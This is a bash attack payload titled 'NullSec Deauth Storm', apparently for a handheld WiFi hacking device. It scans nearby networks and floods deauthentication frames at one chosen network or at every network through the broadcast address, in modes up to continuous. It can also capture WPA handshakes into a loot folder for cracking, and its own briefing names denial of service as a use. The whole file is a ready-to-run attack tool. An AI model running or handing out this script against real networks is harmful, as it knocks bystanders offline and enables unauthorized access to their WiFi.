#!/bin/bash
# Title: NullSec Deauth Storm
# Author: bad-antics
# Description: Mass deauthentication attack against WiFi networks
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR"/{captures,logs}

# --- BRIEFING ---
PROMPT "NULLSEC DEAUTH STORM

Mass WiFi deauthentication
to disconnect all clients.

Use Cases:
- Handshake capture
- Denial of Service
- Client migration

Press OK to configure."

# --- INTERFACE SELECTION ---
ALL_IFS=$(ls /sys/class/net 2>/dev/null | grep -E "wlan|mon")
IFACE_LIST=""
count=1
for iface in $ALL_IFS; do
    IFACE_LIST="${IFACE_LIST}${count}: ${iface}
"
    count=$((count + 1))
done

LIST "SELECT INTERFACE

$IFACE_LIST" IFACE_SEL

IFACE=$(echo "$ALL_IFS" | sed -n "${IFACE_SEL}p")
[ -z "$IFACE" ] && IFACE="wlan1mon"

# --- SCAN FOR TARGETS ---
SCREEN "SCANNING..." "Finding networks..." 3
LED B SLOW

timeout 15 airodump-ng "$IFACE" -w /tmp/deauth_scan --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null

# Parse networks
NETWORKS=""
count=1
while IFS=',' read bssid first last channel speed priv cipher auth power beacons iv lan id essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    essid=$(echo "$essid" | tr -d ' ' | head -c 15)
    channel=$(echo "$channel" | tr -d ' ')
    power=$(echo "$power" | tr -d ' ')
    
    # Skip empty or header lines
    [[ ! "$bssid" =~ ^[0-9A-Fa-f] ]] && continue
    [ -z "$essid" ] && essid="Hidden"
    
    NETWORKS="${NETWORKS}${count}: ${essid} (${power}dBm)
"
    echo "$bssid,$channel,$essid" >> /tmp/targets_list.txt
    count=$((count + 1))
    [ $count -gt 10 ] && break
done < /tmp/deauth_scan-01.csv

LIST "SELECT TARGET

$NETWORKS
0: ALL NETWORKS" TARGET_SEL

# --- ATTACK MODE ---
LIST "ATTACK MODE

1: Single Burst (10 pkts)
2: Sustained (30s)
3: Aggressive (60s)
4: Capture Mode (wait 4 HS)
5: Continuous (until stop)" MODE_SEL

case $MODE_SEL in
    1) DURATION=5; PACKETS=10 ;;
    2) DURATION=30; PACKETS=0 ;;
    3) DURATION=60; PACKETS=0 ;;
    4) DURATION=120; PACKETS=0; CAPTURE=1 ;;
    5) DURATION=0; PACKETS=0 ;;
    *) DURATION=30; PACKETS=10 ;;
esac

# --- GET TARGET INFO ---
if [ "$TARGET_SEL" = "0" ]; then
    TARGET_BSSID="FF:FF:FF:FF:FF:FF"
    TARGET_CHANNEL="all"
    TARGET_NAME="ALL"
else
    TARGET_INFO=$(sed -n "${TARGET_SEL}p" /tmp/targets_list.txt)
    TARGET_BSSID=$(echo "$TARGET_INFO" | cut -d',' -f1)
    TARGET_CHANNEL=$(echo "$TARGET_INFO" | cut -d',' -f2)
    TARGET_NAME=$(echo "$TARGET_INFO" | cut -d',' -f3)
fi

# --- CONFIRMATION ---
PROMPT "DEAUTH STORM READY

Target: $TARGET_NAME
BSSID: $TARGET_BSSID
Channel: $TARGET_CHANNEL
Mode: $MODE_SEL

Press OK to ATTACK!
Press BACK to cancel."

# --- EXECUTE ATTACK ---
SCREEN "DEAUTH ACTIVE" "Attacking: $TARGET_NAME" 3
LED R FAST

# Set channel
if [ "$TARGET_CHANNEL" != "all" ]; then
    iwconfig "$IFACE" channel "$TARGET_CHANNEL" 2>/dev/null
fi

# Start capture if needed
if [ "$CAPTURE" = "1" ]; then
    airodump-ng "$IFACE" --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
        -w "$LOOT_DIR/captures/${TARGET_NAME}_$(date +%Y%m%d_%H%M%S)" \
        --output-format pcap &
    CAPTURE_PID=$!
fi

# Deauth attack
DEAUTH_COUNT=0
START_TIME=$(date +%s)

while true; do
    if [ "$PACKETS" -gt 0 ]; then
        aireplay-ng -0 $PACKETS -a "$TARGET_BSSID" "$IFACE" 2>/dev/null
        DEAUTH_COUNT=$((DEAUTH_COUNT + PACKETS))
        break
    else
        aireplay-ng -0 10 -a "$TARGET_BSSID" "$IFACE" 2>/dev/null
        DEAUTH_COUNT=$((DEAUTH_COUNT + 10))
        
        # Check duration
        if [ "$DURATION" -gt 0 ]; then
            ELAPSED=$(($(date +%s) - START_TIME))
            if [ $ELAPSED -ge $DURATION ]; then
                break
            fi
        fi
        
        # Check for handshake
        if [ "$CAPTURE" = "1" ]; then
            if ls "$LOOT_DIR/captures"/*.cap 2>/dev/null | xargs -I{} aircrack-ng -a2 {} 2>/dev/null | grep -q "1 handshake"; then
                SCREEN "HANDSHAKE!" "Captured WPA handshake!" 3
                LED G FAST
                break
            fi
        fi
        
        sleep 1
    fi
done

# Cleanup
[ -n "$CAPTURE_PID" ] && kill $CAPTURE_PID 2>/dev/null
killall aireplay-ng 2>/dev/null

# --- RESULTS ---
LED G SOLID

CAP_FILES=$(ls "$LOOT_DIR/captures"/*.cap 2>/dev/null | wc -l || echo 0)

PROMPT "DEAUTH COMPLETE

Target: $TARGET_NAME
Packets Sent: $DEAUTH_COUNT
Captures: $CAP_FILES

Saved to: $LOOT_DIR/captures

Press OK to exit."

LED OFF
rm -f /tmp/deauth_scan* /tmp/targets_list.txt
